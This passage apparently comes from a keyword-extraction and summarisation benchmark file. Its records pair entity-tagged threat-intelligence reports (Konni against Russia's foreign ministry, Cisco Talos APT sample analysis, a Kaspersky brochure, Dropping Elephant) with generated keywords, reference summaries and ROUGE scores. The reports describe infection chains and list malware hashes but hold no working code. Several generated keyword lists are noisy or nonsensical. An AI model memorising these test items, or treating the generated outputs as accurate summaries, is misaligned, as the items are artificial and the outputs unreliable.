\u201c as is \u201d without any warranty or condition of any kind , either express or implied . Use of this information is at the end user \u2019s own risk . Services not available everywhere . \u00a9 [DATE] 2021 Lumen Technologies . All Rights Reserved.10/10", "generated_text": "the document; a series; targeted actions; the Russian Federation; Ministry of Foreign Affairs; MID; October 2021; credentials; the Konni malware; Covid; emails; the compromised email account; the Russian Embassy; Indonesia; a deputy minister; National Security; the emails; a trojanized screensaver; The malware; the MID network; The campaigns; the tactics; persistence; the threat actor; multi-stage; the network; persistence; x.", "ref_text": "<START-1>This PDF documents a cyber espionage campaign targeting the Russian Ministry of Foreign Affairs (MID) that uses the Konni malware. Here is a summary: The campaign began in October 2021 with phishing links impersonating MID portals to harvest credentials. In November, the threat actor sent COVID-19 themed lures with files impersonating Russian vaccine registration software that installed malware. In December, the actor compromised an MID email account and sent malicious emails with a trojanized screensaver to MID personnel. Analysis found connections between the phases - same IP, similar TTPs, nearly identical malware. The screensaver downloaded a light-weight loader that retrieved additional payloads from command and control servers. The malware gathered system info and running tasks from infected machines. Based on the tactics, techniques, and procedures, the malware has been attributed to the Konni malware linked to North Korean state-sponsored cyber espionage operations. The campaign demonstrates the persistence of advanced threat actors in targeting high-value organizations through multiple stages to establish network access and enable cyber espionage. Defensive measures like monitoring, multi-factor authentication, and employee education can help protect against such threats. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4836601307189542, "gpt3/lexical/rouge_rouge2": 0.15131578947368424, "gpt3/lexical/rouge_rougeL": 0.2418300653594771, "gpt3/lexical/rouge_rougeLsum": 0.2418300653594771, "gpt3_generated_text": ["In a new article by Black Lotus Labs, a series of targeted actions against the Russian Ministry of Foreign Affairs (MID) have been uncovered. These actions, believed to be carried out using the Konni malware, were aimed at establishing access to the MID network for espionage purposes. The campaigns involved phishing attacks, Covid-related lures, and trojanized files sent through compromised email accounts. The article highlights the patient and persistent nature of the threat actor in targeting high-value networks. The tactics used in these campaigns demonstrate a multi-stage approach, with the threat actor leveraging stolen credentials and exploiting trusted connections to distribute and load malware. The article provides technical details and indicators of compromise related to the Konni campaign."]}, {"split_name": "val", "sample_id": "val_5", "prompt_text": "Extract the keywords: [DATE] THURSDAY , [PERSON] JANUARYRESEARCH SPOTLIGHT : NEEDLES IN A HAYSTACKThis post was authored by [PERSON] Mariano [PERSON] Graziano . [PERSON] Malware sandboxes are automated dynamic analysis systems that execute programs in a controlled environment . Within the large volumes of samples submitted daily to these services , some submissions appear to be different from others and show interesting characteristics . At [ORG] USENIX [ORG] Security [ORG] 2015 I presented a paper in which we proposed a method to automatically discover malware developments from samples submitted to online dynamic analysis systems . The research was conducted by dissecting the [ORG] Anubis sandbox dataset which consisted of over [CARDINAL] 30 M samples collected in [DATE] six [DATE] years . The methodology we proposed was effective and we were able to detect many interesting cases in which the malware authors directly interacted with the sandbox during the development phase of the threats . Another interesting result that came from the research concerns the samples attributed to [ORG] Advanced [ORG] Persistent [ORG] Threat ( [ORG] APT ) campaigns . Surprisingly , some of the malware samples used in these sophisticated attacks had been submitted to the [ORG] Anubis sandbox [DATE] months -- sometimes even [DATE] years -- before the attack had been attributed to the proper [ORG] APT campaign by a security vendor . To be perfectly clear , we are not saying that it took security vendors [DATE] months or [DATE] years to detect a threat . Most times , we are able to detect the threats in no more than a few hours . It is just that the malware samples were mislabeled and not properly associated with [ORG] APT campaigns . In general , the same goes for non [NORP] - [NORP] APT malware campaigns . In this blog post , we tried to see if the same applied to the [GPE] Cisco dataset . Speci\ufb01cally , we chose [CARDINAL] ten [ORG] APT campaigns , -- some of which were already covered in the   [PERSON] Usenix paper . We decided to inspect [CARDINAL] two different datasets : our incoming sample feeds / malware zoo , and the telemetry associated with our [ORG] Advanced [ORG] Malware [ORG] Protection ( [ORG] AMP ) solutions . [PERSON] Talos receives samples from [CARDINAL] over [CARDINAL] 100 external feeds ranging from anti - malware companies to research centers , while the [ORG] AMP dataset contains telemetry from the [ORG] Cisco [ORG] AMP user - base . The remaining part of this post is organized as follows . [ORDINAL] First , we show the [ORG] APT campaigns we investigated . [ORDINAL] Second , we summarize the results of the analysis of the [ORG] Talos dataset . [ORDINAL] Third , we show the results from the [ORG] AMP dataset . Finally , we summarize our \ufb01ndings . [ORDINAL] Third , we show the results from the [ORG] AMP dataset . Finally , we summarize our \ufb01ndings . APTCAMPAIGNSAPT [NORP] CAMPAIGNBeebus [PERSON] Paci\ufb01c [PERSON] RAT [PERSON] Regin [PERSON] Net TravellerBrutPOSMADE PUBLIC February 2015July 2014November 2014 [DATE] January [DATE] 2010July [DATE] 2014 [DATE] June [DATE] 2013 [DATE] July 2014The [CARDINAL] ten malware campaigns in the table above garnered signi\ufb01cant media attention when   discovered , with some of them clearly falling in the area of [ORG] APT . They were found by different security companies [DATE] between [DATE] 2010 [DATE] and [DATE] 2015 , having different levels of sophistication and different objectives . Moreover , these [ORG] APT campaigns were not limited to western countries . They have affected organizations all over the world . Most of the time , connecting the dots and drawing relationships between samples and campaigns take [DATE] months and many experts . This means the security company that releases a detailed report documenting the campaign is aware of it long before the information is made public . However , we believe the \u201c public release \u201d date is still a good metric , because it is the moment at which all the other security companies and the entire world are made aware of these threats . Another important aspect during an [ORG] APT investigation is attribution . While detection is done quickly , attribution for these campaigns is often an open and hard problem to solve . Most of the times the perpetrators remain unknown even after [DATE] months of work by security researchers . However , sometimes researchers are able to connect the dots and attribute the attack to a threat actor . This was the case for some of the [ORG] APT campaigns discussed so far . Some of these threats have been attributed to state - sponsored actors , others to cyber criminals or to espionage attacks . However , like in the [ORG] USENIX publication , in this post we will make no speculation about attribution . In the next paragraphs , we will present the results of searching for samples associated with these [ORG] APT campaigns in our datasets . [ORG] TALOSDATASETAPTCAMPAIGNBeebus [ORG] Paci\ufb01c [ORG] RAT [ORG] Regin [ORG] Net [ORG] TravellerBrutPOSAVG [ORG] DAYS [ORG] BEFORE [ORG] APT CAMPAIGNPUBLICALLY IDENTIFIED574 [CARDINAL] 68This table shows the results of the analysis of our incoming sample feeds / malware zoo . For every campaign , we checked in our malware zoo to see when they had been initially submitted to us . Given that we know when information about these [ORG] APT campaigns was made public , we can compute [DATE] the [DATE] number [DATE] of [DATE] days it took the security community to publicly tie the samples to an [ORG] APT campaign , even though the samples had been marked malicious for other reasons . On average , these samples went for [DATE] 458 [DATE] days before being tied to an [ORG] APT campaign . The table presents the average number of days for the entire campaign , and we go from [DATE] a [DATE] few [DATE] months as in the case of \u201c [PERSON] Aurora \u201d to [DATE] more [DATE] than [DATE] three [DATE] years for \u201c Equation \u201d . Notice that these \ufb01gures come from our malware zoo which collects   samples from external sources and in general are a good indicator given the amount of samples received per day . Notice that these numbers vary based on the dataset . VIRUSTOTALThe vast majority of the submissions come from big organizations such as Antivirus companies . Interestingly , a signi\ufb01cant percentage is submitted by   [ORG] VirusTotal . For this reason we decided to check the submitters for possible links and intelligence information . As already documented by [PERSON] Dixon , information about the submitters of samples is not publicly available , but can partially be retrieved from their [ORG] Intelligence service . For every sample , it is possible to know a hash ( a hexadecimal unique identi\ufb01er of the submitter ) , the   country ( from the geolocalization of the [ORG] IP address of the submitter ) and the method ( the way the sample has been submitted , for instance via the web interface or the APIs ) . This opaque information complicates the analysis a little bit , but it is still possible to obtain interesting results . SUBMITTERCAMPAIGNS6exxxxxx14xxxxxx b4xxxxxxAridViper [ORG] Nettraveller [ORG] RedOctober BrutPOSPittyTigerAridViper ReginAridViper [PERSON] Regin [PERSON] Nettraveller BrutPOS PittyTiger [PERSON] AridViper [PERSON] Nettraveller Paci\ufb01cRAT BrutPOS PittyTigerEquation Regin BrutPOS AurorEquation Regin BrutPOSRegin ReginBeebus [PERSON] PittyTiger [PERSON] Nettraveller BrutPOSAuroraThe table above summarizes our \ufb01ndings from [ORG] VirusTotal . The \ufb01rst column shows the    hash of the submitter . This means that the submitter sent one or more samples of a given [ORG] APT campaign to [ORG] VirusTotal before its public release . One can only speculate on who these submitters are . They could very likely be the threat actors themselves , testing to see if their malware is detected by the AV companies . They could also be security researchers or vendors who are trying to get information from [ORG] VirusTotal . It is noteworthy that in most of the cases the same submitters uploaded samples belonging to different [ORG] APT campaigns . CISCOAMPWe went through our logs to search for entries that contained hashes related to the [CARDINAL] ten [ORG] APT campaigns we have been investigating . Interestingly , we got hits for [CARDINAL] eight different hashes belonging to [CARDINAL] three different campaigns that were discovered on [ORG] Cisco [ORG] AMP customer machines before the [ORG] APT campaign was publicly identi\ufb01ed . [ORG] APT [ORG] CAMPAIGN ( [ORG] NUMOF SAMPLES)Arid Viper ( 1 SAMPLE ) Equation ( 1 SAMPLE ) BrutPOS ( [CARDINAL] 6 SAMPLES)DAYS BEFORE APT CAMPAIGNPUBLICALLY IDENTIFIED-50 +1 -64As illustrated in the table above , we identi\ufb01ed [CARDINAL] eight malicious samples that were in the   wild before being associated with [ORG] APT campaigns . It is important to repeat that most of these samples were detected as malicious the moment they \ufb01rst appeared on our these samples were detected as malicious the moment they \ufb01rst appeared on our   customers \u2019 machines . Surprisingly , [CARDINAL] one sample of the Equation APT campaign ( fanny worm ) was found and blocked on a [ORG] Cisco [ORG] AMP customer \u2019s machine a day after the public release of the [PERSON] Kaspersky report . HASH ( SHA256)DATE DISPOSITION APT003315B0AEA2FCB9F77D29223DD8947D0E6792B3A0227E054BE8EB2A11F443D92015 - 02 - 17MALICIOUSEQUATION003315B0AEA2FCB9F77D29223DD8947D0E6792B3A0227E054BE8EB2A11F443D92015 - 02 - 17MALICIOUSEQUATION015FBC0B216D197136DF8692B354BF2FC7BD6EB243E73283D861A4DBBB81A7512014 - 12 - 20UNKNOWNARID VIPER015FBC0B216D197136DF8692B354BF2FC7BD6EB243E73283D861A4DBBB81A7512014 - 12 - 20MALICIOUSARID VIPER015FBC0B216D197136DF8692B354BF2FC7BD6EB243E73283D861A4DBBB81A7512015 - 01 - 02MALIICIOUSARID VIPER015FBC0B216D197136DF8692B354BF2FC7BD6EB243E73283D861A4DBBB81A7512015 - 01 - 16MALICIOUSARID VIPER015FBC0B216D197136DF8692B354BF2FC7BD6EB243E73283D861A4DBBB81A7512015 - 02 - 12MALICIOUSARID VIPER14BFDA4A4ACA1276388702D0FB7629AF120FF34C1ACDEB7613815F2981C998322014 - 05 - 07MALICIOUSBRUTPOS508909C8A00026C904F52099DD62BBF4062B4E8E40FC0601BD9E13570514B4F52014 - 05 - 06MALICIOUSBRUTPOS7170A07BCB5B0467A75CBD17A1A1877AEC3C8EA43C45D3BED6AB5E6C95A627132014 - 05 - 06MALICIOUSBRUTPOS9A10916AD0F43FA3376C2E54FD5CFDD06D684B3A19895ED4107FAF9F3313DCDA2014 - 05 - 07MALICIOUSBRUTPOSE28EABEB678AFB5E172F4127C5692E742809FD86DFA8478C1DC6F9C13B2A8E5F2014 - 05 - 06UNKNOWNBRUTPOSE28EABEB678AFB5E172F4127C5692E742809FD86DFA8478C1DC6F9C13B2A8E5F2014 - 05 - 07MALICIOUSBRUTPOSBased on our logs , [ORG] Cisco [ORG] AMP found the sample [CARDINAL] 015FBC0B216D197136DF8692B354BF2FC7BD6EB243E73283D861A4DBBB81A751 twice on [DATE] 2015 [DATE] - 12 [DATE] - 20 . It was \u201c unknown \u201d to [ORG] AMP the \ufb01rst time , but detected as malicious the   was \u201c unknown \u201d to [ORG] AMP on [DATE] 2014 [DATE] - 05 [DATE] - 06 , but detected as malicious the next time it was seen on a customer \u2019s machine on [DATE] 2014 [DATE] - 05 [DATE] - 07 . In all the other cases the samples were already considered malicious . CONCLUSIONAs the number of threats per day continues to increase , the number of malware samples security companies automatically analyze increases . Much of the analysis is comprised of dynamic analysis systems , such as sandboxes , to determine whether the sample is malicious or not . These samples are then stored for further analysis . Due to the large numbers of samples , in many organizations the vast majority of these samples remainnumbers of samples , in many organizations the vast majority of these samples remain categorized solely on the initial sandbox run . Even when these samples are shared among companies or via other services like [ORG] VirusTotal some malware samples can go unnoticed for [DATE] months because they are marked as malware but given some generic name , such as \u201c Win . Trojan . Agent \u201d . Then we are shocked when a security company discovers an [ORG] APT campaign that has supposedly gone unnoticed for [DATE] years . The results of this post con\ufb01rm the assumption of the [PERSON] Usenix   paper , also based on a dataset of a big security company and similar results are expected throughout the security industry . Many times , malware is initially submitted to sandbox systems and marked as malicious based on the output of the sandbox . Then the authors use that information to tweak the sample to avoid detection in future sandbox runs through various evasion tactics . In other situations , the initial sample may not even be \ufb02agged as malicious due to   evasion techniques being utilized . By performing statistical analysis and reducing the data through clustering , even samples that avoid initial sandbox detection can potentially be detected as malicious . There is clearly a need for more advanced analytical systems to identify campaigns and link the samples together . Identifying [DATE] today \u2019s threats requires multiple layers of protection at various points across the network , along with constantly updated threat intelligence information . [GPE] Cisco analyzes a massive amount of telemetry data and is able to \ufb02ag malware as malicious based on   multiple factors . By performing manual and programmatic analysis of sandbox data in conjunction with identifying behaviors which are associated with malicious activity , even unknown [ORG] APT campaigns can be neutralized . RT LENO COMMENTS : POST A COMMENTEnter your comment Comment as : Select profile [EVENT] Publish [EVENT] COTMOM : ENSSUEBARCHSUBSCRPostsCommentsSubscribe via EmailL Bypassing [PERSON] MiniUPnP [PERSON] Stack [PERSON] Smashing [PERSON] ProtectionYBypassing MiniUPnP [ORG] Stack [ORG] Smashing [ORG] Protection [ORG] Research Spotlight : [ORG] Needles in a Haystack Microsoft Patch [DATE] Tuesday [DATE] - [DATE] January [DATE] 2016 Rigging compromise - RIG Exploit Kit \u25ba 2 Good People Goodness : A Toast to Kanouff , [PERSON] Clemson , and [PERSON] Raman ! Snort Subscriber Rule Set Update for [DATE] 05/11/2016 ClamAV [CARDINAL] 0.99.2 has been released!NLVLOARMOT \u00ae BDGGLEDBLOGSOGSoftware [ORG] CommunityVulnerability [ORG] Reports Additional ResourcesMicrosoft to [ORG] SID [ORG] Mapping [ORG] Archive [ORG] Shared [ORG] Object [ORG] Rule [ORG] GeneratorIP [ORG] Blacklist [ORG] DownloadAWBO [ORG] ExercisesAbout Talos Join Our TeamContact BlogCONNECT WITH [GPE] US \u00a9 [DATE] 2015 [ORG] Cisco [ORG] Systems , Inc. and/or its af\ufb01liates . All rights reserved . View our   Privacy Policy here .", "generated_text": "PDF; analysis; The use; a method; a method; dynamic analysis systems; samples; the Anubis Sandbox; months; years; the malware authors; the sandbox; Advanced Persistent Threat; campaigns; the malware; Adversary; the attackers; the analysis; the Talos; 100; telemetry; Cisco; detection; attribution; time; the attackers; detection; the sandbox; a report; the attackers; APT campaigns; the report; this research; attribution.", "ref_text": "<START-1>The PDF is a blog post by Cisco Talos describing their analysis of past APT malware campaigns in their threat intelligence datasets. They looked at 10 major APT campaigns made public between 2010-2015, including campaigns like Aurora, Equation, Red October etc. Attribution is not discussed. They searched for these malware samples in the Talos malware zoo (feeds from AV companies, researchers etc.) and found samples for most campaigns existed in their zoo months or years before public disclosure of the APT campaigns. On average, it took 458 days after initial detection for samples to be publicly tied to an APT campaign. The gap was as high as 3 years for Equation samples. Analysis of VirusTotal submitters showed certain entities had submitted samples from multiple campaigns, indicating possible links between campaigns or actors. In the Cisco AMP customer telemetry, they found pre-dated samples related to 3 campaigns. Most were detected as malicious when first seen, but some evaded initial detection. The post concludes that while detection happens quickly, connecting samples to campaigns takes longer due to high volumes of generic malware. Sandbox evasion also delays detection. Their findings validate that threat actors submit samples to test defenses prior to attacks. Better analytics are needed to identify and correlate samples early to discover stealthy campaigns in progress. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.3765281173594133, "gpt3/lexical/rouge_rouge2": 0.06388206388206388, "gpt3/lexical/rouge_rougeL": 0.1711491442542787, "gpt3/lexical/rouge_rougeLsum": 0.1711491442542787, "gpt3_generated_text": ["This article discusses the use of malware sandboxes, which are automated dynamic analysis systems that execute programs in a controlled environment, to detect and analyze malware developments. The research focuses on the analysis of the Anubis sandbox dataset, which consists of over 30 million samples collected over six years. The researchers propose a method to automatically discover malware developments from samples submitted to online dynamic analysis systems and were able to detect cases where malware authors directly interacted with the sandbox during the development phase. Additionally, the researchers found that some malware samples used in Advanced Persistent Threat (APT) campaigns had been submitted to the sandbox months or even years before the attack was attributed to the proper APT campaign. The article also discusses the analysis of the Cisco dataset, specifically the incoming sample feeds/malware zoo and the telemetry associated with their Advanced Malware Protection (AMP) solutions. The results of the analysis are summarized, and the article emphasizes the importance of timely detection and attribution in APT investigations. Overall, this research highlights the effectiveness of malware sandboxes in detecting and analyzing malware developments and the challenges in attribution in APT campaigns."]}, {"split_name": "val", "sample_id": "val_6", "prompt_text": "Extract the keywords: Kaspersky Security for Virtualization Integrated with [ORG] VMware NSX platformData is your business \u2019s most important asset . So how and where that data is stored , processed and transmitted is critical not just to achieving a greater competitive advantage , but also to increasing operational efficiency and maintaining business continuity . There are many superior data processing , storage and networking solutions out there . But networking solutions in particular can be complex , inflexible and all too often tied to , and limited by , the hardware platform they \u2019re built on . This in turn impedes your data center \u2019s agility , and your ability to satisfy rapidly changing business requirements . Traditional security solutions do not meet your private cloud needs\u2022 Not elastic enough for your clouds \u2022 Can not inter - operate via native API \u2022 Lack in providing full visibility on IT \u2022 Cause \u2018 update and scanning storms [WORK_OF_ART] \u2019 [WORK_OF_ART] \u2022 [WORK_OF_ART] Eat your private cloud resourcesHow You Benefit From Natively Integrated Agentless Security for [ORG] VMware [ORG] NSX:\u2022 [ORG] Fully automated deployment of [ORG] SVM , a specialized security appliance , based on the security polices applied to each protected VM on the hypervisor host.\u2022 Integration with NSX Security Policiesallows each protected VM to receive precise , granular security capabilities to let you scale corporate software - defined data center with no borders.\u2022 Integration with NSX Security Tagsallows your software - defined data center detect and react to most advanced threats in real - time fashion , and even reconfigure the entire infrastructure if necessary.\u2022 Full infrastructure scanning protects all VMs , whether they are on- or offline , for even better cybersecurity coverage right across your entire virtual infrastructure.\u2022 Proactive defense against cyberthreatsthrough use of the cloud - based [ORG] Kaspersky [ORG] Security [ORG] Network . [ORG] VMware \u00ae and [PERSON] Kaspersky [PERSON] Lab together address these issues through a joint solution built around a highly efficient Software - Defined [ORG] Data [ORG] Center , armed with advanced security capabilities to ensure high - level protection from internal or external threats , allowing you to work with different pools of network resources , dynamically creating or reconfiguring your entire network topology in a matter of [TIME] seconds , using a \u201c [CARDINAL] zero trust \u201d security approach . [ORG] Kaspersky [ORG] Security [ORG] for [ORG] Virtualization [ORG] Agentless has been specifically designed to protect private clouds built on [ORG] VMware NSX for [ORG] vSphere . This joint solution delivers advanced security capabilities to each VM within your private cloud with near - [CARDINAL] zero impact on systems efficiency . Built - in [ORG] VMware NSX ServicesDistributed FirewallVirtual networks ( VXLAN)Server Activity MonitoringVPN ( [ORG] IPSec , [ORG] SSL [ORG] L2VPN)Kaspersky [ORG] Security for VirtualizationAgentless Anti - malwareVirtual Network IDS / IPSServer Activity MonitoringSecurity Policies integrationSecurity Tags integrationScans even powered - off [CARDINAL] VMsNative interaction between your virtualization platform and its security solution means your private cloud can react in real time to any security incident across your entire infrastructure . Unified orchestration console lets your teams centrally manage the security of all your VMs , together with the Kaspersky Lab security products running on your physical servers , endpoints and even mobile devices , so it becomes easier for your team to manage entire hybrid cloud environment , with less pressure on IT resources , and less scope for human error . A perfectly balanced combination , so you can implement , orchestrate and scale security regardless of the size and complexity of your private cloud . Preserves the private cloud ROIBecause Kaspersky Security for Virtualization has been specifically developed to protect virtual machines ( VMs ) , it helps businesses maintain a high machine density and high perfomance \u2013 preserving your virtualization ROI while eliminating update and scanning \u2018 storms \u2019 , together with Windows of Vulnerability or \u2018 instant - on \u2019 gaps . Designed For Any VirtualizationsKaspersky Security for Virtualization is more than just \u2018 designed for \u2019 virtualization platforms : it utilizes the core technologies of those platforms to optimize the security capabilities of both platform and security solution . From now on , your infrastructure and its security solution work in harness for maximum effectiveness . [PERSON] Shields [PERSON] Entire [PERSON] Virtual NetworkKaspersky \u2019s [PERSON] Network [PERSON] Attack [PERSON] Blocker monitors network traffic for signs of activity typical of network attacks . [ORG] Kaspersky [ORG] Security [ORG] for Virtualization Agentless provides this network - level functionality together with support for both [ORG] VMware [ORG] vCloud [ORG] Networking [ORG] and [ORG] Security and [ORG] VMware NSX platforms . For [PRODUCT] Windows and Linux VMsKaspersky Security for Virtualization is truly a perfectly engineered solution for hybrid data centers that delivers advanced security capabilities to any virtual server regardless of the operating system running inside it . We protect both Windows and Linux servers , including [PERSON] RHEL [PERSON] 7GA , SLES [CARDINAL] 12 [ORG] GA and Ubuntu [CARDINAL] 14.04 LTS.Specifically Designed for [ORG] VMware NSX Security\u2022Interoperability with [ORG] VMware NSX lets infrastructure and security layers work together in close co - operation , bringing new levels of automation and protection.\u2022 Automated deployment for [ORG] VMware NSX allows the [ORG] SVM ( Security VirtualMachine ) to \u2018 pop up \u2019 automatically on the hypervisor , based on the requirements of the protected VMs sitting on that host.\u2022 Security Policy integration means each VM receives precise security capabilities,\u2022as defined by your corporate policies based on the VM \u2019s individual role . Integration with NSX Security Tags allows your private cloud to react in real - time to security incidents , automatically reconfiguring the entire infrastructure if necessary . [ORG] Security [ORG] Virtual [ORG] Machine ( [ORG] SVM ) \u2022 Natively integrates with [ORG] VMware [ORG] \u2022 [ORG] Supports [ORG] NSX and [ORG] vShield [ORG] Endpoint \u2022 No impact on platform performance \u2022 Anti - malware for [ORG] Windows [ORG] & [ORG] Linux \u2022 Scans powered [ORG] ON [ORG] and [ORG] OFF machinesNetwork [PERSON] Attack [PERSON] Blocker ( NAB ) \u2022 Powerful protection for networks \u2022 Web - tra(cid:10)c control with URL scanning \u2022 Heuristic analyzer to protect applications \u2022 Instant protection for entire infrastructureVMVMVMVMNABAutomated Security and Monitoring\u2022 Full infrastructure scanning protects all VMs , whether they are on- or offline , for even better security coverage right across your infrastructure.\u2022 Routine scanning of all VMs can be pre - scheduled at a granular level , so security tasks can be orchestrated according to your [PERSON] needs.\u2022 Self - protection and advanced [NORP] SNMP - based monitoring guaranties that SVMs are always up and running , and able provide extensive information to 3rd - party monitoring tools for extra control.\u2022 [PERSON] Advanced protection will be never interrupted , even if a workload is movedthrough the cloud \u2013 [ORG] VMware [ORG] vMotion and [ORG] Disaster Recovery \u2019s own capabilities are fully supported . [PERSON] Superior [PERSON] Reliability and Manageability\u2022 A single unified management console for virtual , physical and mobile devices means you can enforce consistent security policies across your entire IT estate . \u2022 Deployment with no downtime \u2013 no need to reboot any [PERSON] VMs or put the host\u2022server into maintenance mode . Intelligent scan task orchestration and automation eliminates any peaks in hypervisor resource consumption to preserve overall platform efficiency.\u2022 [ORG] Feature - rich reporting and monitoring makes it easier to manage andsupervise security throughout your organization . The result is a powerful , elastic and fully secure private cloud environment . [ORG] Learn more at [WORK_OF_ART] www.kaspersky.com/enterpriseKaspersky [WORK_OF_ART] Lab [WORK_OF_ART] Enterprise Cybersecurity : [WORK_OF_ART] www.kaspersky.com/enterprise Cyber Threats News : www.securelist.com IT Security News : business.kaspersky.com/#truecybersecurity # HuMachine", "generated_text": "Kaspersky Security for Virtualization; Integrated; VMware NSX; vSphere; Protection; Virtual Machines; VMs; isolated environments; LS; a specialized security appliance; the security polices; each protected VM; the hypervisor host; SVMs; visibility; the security policies; NSX Security Tags; internal or external threats; full infrastructure scanning; the entire network; zero trust; trust; granular security capabilities; the cloud-based Kaspersky Security Network; zero trust; no borders; a \u2018swallow\u2019; zero trust; zero threat protection; use; zero-trust; a combination; flexible security solutions; NO; the size; complexity; zero impact.", "ref_text": "<START-1>The document discusses the integration of Kaspersky Security for Virtualization with the VMware NSX platform to provide advanced security for software-defined data centers. Virtualization platforms like VMware NSX help data centers become more agile and dynamically configurable. However, traditional security solutions are not designed for these virtual environments and can impede performance and flexibility. The integrated Kaspersky-VMware solution allows unified orchestration and management of security policies across physical, virtual, and mobile endpoints. Key benefits include: - Automated deployment of security virtual machines (SVMs) based on policies applied to VMs on each hypervisor host. This provides granular security tailored to each VM's role. - Integration with NSX Security Tags lets the infrastructure automatically react and reconfigure in real-time in response to threats. - Agentless full infrastructure scanning, including offline VMs, eliminates gaps in security coverage. - Intelligent orchestration of scanning eliminates resource consumption peaks and disruption. - No downtime for VM reboot or server maintenance required for deployment. - Single console for managing consistent security across the hybrid infrastructure. - Utilizes VMware native capabilities for maximum interoperability and performance. In summary, the integrated solution allows software-defined data centers to implement elastic, automated security that is tailored to their needs, without impacting efficiency or agility. The native VMware-Kaspersky integration brings security into the software-defined infrastructure. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.5219638242894058, "gpt3/lexical/rouge_rouge2": 0.14025974025974025, "gpt3/lexical/rouge_rougeL": 0.2428940568475452, "gpt3/lexical/rouge_rougeLsum": 0.2428940568475452, "gpt3_generated_text": ["The article discusses the importance of data storage, processing, and transmission in achieving a competitive advantage and maintaining business continuity. It highlights the limitations of traditional networking solutions and the need for flexible and integrated security solutions. The article introduces Kaspersky Security for Virtualization, which is integrated with the VMware NSX platform, to provide advanced security capabilities for virtual machines (VMs) in isolated environments. The solution offers automated deployment, granular security capabilities, and full infrastructure scanning to protect against internal and external threats. It also utilizes the cloud-based Kaspersky Security Network for proactive defense against cyberthreats. The article emphasizes the zero-trust security approach and the ability to react in real-time to security incidents across the entire infrastructure. It also mentions the ease of central management and scalability of security in hybrid cloud environments. Kaspersky Security for Virtualization is specifically designed for VMware NSX and offers protection for both Windows and Linux VMs. Overall, the solution provides advanced security with zero impact on system efficiency and helps businesses preserve their virtualization ROI."]}, {"split_name": "val", "sample_id": "val_7", "prompt_text": "Extract the keywords: 2016/7/14The Dropping Elephant actor - [ORG] SecurelistThe [ORG] Dropping [ORG] Elephant \u2013 aggressive cyber- espionage in the [NORP] Asian regionBy GReAT on [DATE] July 8 , [DATE] 2016 . [DATE] 5:57 amRESEARCHAPT SPEAR - PHISHING VULNERABILITIESGReAT [PERSON] Kaspersky [PERSON] Lab 's [ORG] Global [ORG] Research [ORG] & [ORG] Analysis Team@e_kaspersky / greatDropping Elephant ( also known as \u201c Chinastrats \u201d and \u201c [WORK_OF_ART] Patchwork \u201c ) is a relatively new threat actor that is targeting a variety of high profile diplomatic and economic targets using a custom set of attack tools . Its victims are all involved with [GPE] China \u2019s foreign relations in some way , and are generally caught through spear   phishing or watering hole attacks . Overall , the activities of this actor show that low investment and ready made offensive toolsets can be very effective when combined with high quality social engineering . We have seen more such open source toolset dependency with meterpreter and [PERSON] BeEF , and expect to see this trend continue . [WORK_OF_ART] The [WORK_OF_ART] Attack Method : [WORK_OF_ART] Infection [WORK_OF_ART] VectorDropping [WORK_OF_ART] Elephant uses [CARDINAL] two main infection vectors that share a common , and fairly elaborately maintained , social engineering theme \u2013 foreign relations with [GPE] China . The [ORDINAL] first approach involves spear phishing targets using aurl [ORG] Dropping [ORG] Elephant actor - Securelistdocument with remote content . As soon as the user opens the document , a \u201c ping \u201d request is sent to the attackers \u2019 server . At this point , the attackers know the user has opened the document and send another spear phishing email , this time containing an MS Word document with an embedded executable . The Word document usually exploits CVE 2012 0158 . Sometimes the attackers send an [ORG] MS [ORG] PowerPoint document instead , which exploits CVE [DATE] 2014 6352.Once the payload is executed , an UPX packed AutoIT executable is dropped . Upon execution , this downloads additional components from the attackers \u2019 servers . Then the stealing of documents and data begins . The [ORDINAL] second approach involves capturing victims through watering hole attacks . The actor created a website that downloads genuine news articles from other websites . If a website visitor wants to view the whole article they would need to download a [ORG] PowerPoint document . This reveals the rest of the article , but also asks the visitor to download a malicious artifact . The [CARDINAL] two main infection vectors are supported by other approaches . Sometimes , the attackers email out links to their watering hole websites . They also maintain Google+ , Facebook and twitter accounts to develop relevant [ORG] SEO and to reach out to wider targets . Occasionally , these links get retweeted , indiscriminately bringing more potential victims to their watering holes . [PERSON] The [PERSON] Attack [PERSON] Tools1 . [PERSON] Malware [PERSON] AnalysisThe backdoor is usually UPX packed but still quite large in size . The reason for this is that most of the file comprises meaningless overlay data , since the file is an automatically generated AutoIT executable with an AutoIT3 script embedded inside . Once started , it downloads additional malware from the C2 and also uploads some basic system information , stealing , among other things , the user \u2019s Google Chrome credentials . The backdoor also pings the [CARDINAL] C2 server at regular intervals . A good security analyst can spot this while analyzing firewall log files and thereby find out that something suspicious might be going on in the network . Generally speaking , backdoors download additional malware inurl Dropping Elephant actor - Securelistthe form of encrypted or packed executables / libraries . But , in the case of [ORG] Dropping [ORG] Elephant , the backdoor downloads encoded blobs that are then decoded to powershell command line \u201c scripts \u201d . These scripts are run and , in turn download the additional malware . [CARDINAL] One of the more interesting malware samples downloaded is the file stealer module . When this file stealer is executed , it makes another callback to the C2 server , downloading and executing yet another malware sample . It repeatedly attempts to iterate through directories and to collect files with the following extensions : doc , docx , ppt , pptx , pps , ppsx , xls , xlsx , and pdf . These files are then uploaded to the C2 server . Also interesting are the resilient communications used by this group . Much like the known actors [PERSON] Miniduke or [ORG] CommentCrew , it hides base64 encoded and encrypted control server locations in comments on legitimate web sites . However , unlike the previous actors , the encrypted data provides information about the next hop , or the true C2 for the backdoor , instead of initial commands.2 . C2 [ORG] AnalysisIn many cases it was very difficult to get a good overview of the campaign and to find out how successful it is . By combining [ORG] KSN data with partner provided [CARDINAL] C2 server data , we were able to obtain a much fuller picture of the incident . We examined connections and attack logins to this particular C2 . As it turned out , the attackers often logged in via a [ORG] VPN , but sometimes via IPs belonging to an ordinary [ORG] ISP in [GPE] India . We then looked at the time the attackers were active , of which you can find an image below.url Pro\ufb01le and Geography3/102016/7/14Victim Pro\ufb01le and [ORG] GeographyThe [ORG] Dropping [ORG] Elephant actor - [ORG] SecurelistWe also wanted to get a better idea of the geolocation of most visitors . Analysis of the image provided access counts and times , along with the IP of the visiting system . Noteworthy are the many IPs located in [GPE] China . This focus on [GPE] China related foreign relations was apparent from the ongoing social engineering themes that were constant throughout the attacks 